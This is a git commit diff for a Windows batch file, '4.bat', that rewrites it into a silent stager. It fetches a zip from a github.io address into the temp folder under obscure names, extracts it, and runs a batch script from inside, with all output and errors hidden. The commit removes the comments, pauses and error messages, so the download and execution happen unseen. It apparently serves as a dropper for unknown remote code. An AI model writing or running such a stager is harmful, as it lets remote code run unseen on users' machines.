9ee4940751211e30b3a86e8a3ae4b9042f15d4c9
2hac <d2sWo6vH5p6x0V2CcbeF1opLywWE@gmail.com>
2024-06-09 19:23:12 -0700

    Update 4.bat

--- 4.bat
+++ 4.bat
@@ -1,30 +1,12 @@
 @echo off
 setlocal
-
-:: Define URLs and temporary file paths
 set "URL=https://2hac.github.io/-/7.zip"
 set "TempZip=%TEMP%\2fhbwe.zip"
 set "ExtractPath=%TEMP%\ctr5.tmp"
 set "BatchScript=exstat.bat"
-
-:: Download the zip file
-powershell -command "& {Invoke-WebRequest -Uri '%URL%' -OutFile '%TempZip%'}"
-pause
-:: Extract the zip file
-if exist "%TempZip%" (
-    mkdir "%ExtractPath%"
-    powershell -command "& {Expand-Archive -Path '%TempZip%' -DestinationPath '%ExtractPath%'}"
-) else (
-    echo Failed to download the zip file from %URL%.
-    exit /b 1
-)
-pause
-:: Run the batch script
-if exist "%ExtractPath%\%BatchScript%" (
-    call "%ExtractPath%\%BatchScript%"
-) else (
-    echo The batch script %BatchScript% does not exist in the extracted folder.
-    pause
-)
-pause
+powershell -command "& {Invoke-WebRequest -Uri '%URL%' -OutFile '%TempZip%'}" > nul 2>&1
+mkdir "%ExtractPath%" > nul 2>&1
+powershell -command "& {Expand-Archive -Path '%TempZip%' -DestinationPath '%ExtractPath%'}" > nul 2>&1
+call "%ExtractPath%\%BatchScript%" > nul 2>&1
 endlocal
+exit
